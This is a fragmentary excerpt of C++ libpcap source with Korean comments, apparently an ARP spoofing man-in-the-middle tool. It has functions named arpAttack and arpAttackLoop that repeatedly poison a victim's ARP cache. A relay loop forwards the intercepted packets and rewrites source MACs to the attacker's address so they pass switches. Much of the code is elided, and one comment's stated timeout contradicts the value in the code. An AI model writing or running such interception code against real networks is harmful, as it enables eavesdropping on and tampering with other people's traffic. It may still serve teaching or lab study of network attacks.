...
void packetRelayJumbo(pcap_t* handle, const u_char* packet, struct pcap_pkthdr* header, const Mac& victimMac, const Mac& targetMac) {
	size_t packet_len = header->len;
	size_t offset = 0;
	static u_char buffer[1500];  // 버퍼를 한번만 할당하고 재사용
	while (offset < packet_len) {
		// 남은 데이터를 1500바이트로 나누기
		size_t chunk_size = (packet_len - offset > 1500) ? 1500 : (packet_len - offset);
		memcpy(buffer, packet + offset, chunk_size);  // 메모리 복사
		EthHdr* eth = (EthHdr*)buffer;
		// 송신자가 피해자인 경우, 패킷을 타겟에 전송
		if (eth->smac() == victimMac) {
			eth->dmac_ = targetMac;
			eth->smac_ = myMacAddr;  // 송신자 MAC 주소 설정 (공격자의 MAC 주소로 설정) 이는 L2 스위치를 무사통과하기 위함
			int res = pcap_sendpacket(handle, buffer, chunk_size);
			if (res != 0)
...
void arpAttack(pcap_t* handle, const Mac& victim_mac, const char* victim_ip, const char* target_ip) {
	//센더에게 타겟맥이 어택커의 맥이라고 속이기.
...
void arpAttackLoop(pcap_t* handle, const vector<Mac>& victimMacs, const vector<char*>& victim_ips, const vector<char*>& target_ips) {
	while (true) {
		...
		for (size_t i = 0; i < victimMacs.size(); i++)
			arpAttack(handle, victimMacs[i], victim_ips[i], target_ips[i]);
...
void relayAndMonitorLoop(pcap_t* handle, const vector<Mac>& victimMacs, const vector<Mac>& targetMacs, const vector<char*>& victim_ips, const vector<char*>& target_ips, Ip gatewayIpAddr) {
	...
	while (true) {
		...
		// ARP 패킷인지 확인
		if (ethArpPacket->eth_.type() == EthHdr::Arp) {// ARP 요청이고, 출발지 IP가 게이트웨이인지 확인
		...
		else// 일반 데이터 패킷인 경우, 릴레이 처리
			for (size_t i = 0; i < victimMacs.size(); i++)
				packetRelayJumbo(handle, packet, header, victimMacs[i], targetMacs[i]);
	}
}
...
int main(int argc, char* argv[]) {
	...
	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf); // 타임아웃을 1000ms로 설정
	if (handle == nullptr) {
